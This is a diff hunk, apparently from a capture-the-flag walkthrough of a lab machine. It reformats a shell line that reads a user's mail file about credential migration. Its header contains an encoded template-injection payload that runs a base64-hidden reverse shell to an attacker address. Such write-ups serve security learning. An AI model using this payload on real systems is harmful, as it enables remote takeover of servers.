@@ -18,7 +18,7 @@ test%0A<%25%3dsystem("echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC41OS8xMTIzNCA
 
 ``` 
 susan@perfection:/$ cat /var/mail/susan
-cat /var/mail/susan
+susan@perfection:/$ cat /var/mail/susan
 
 Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students
 
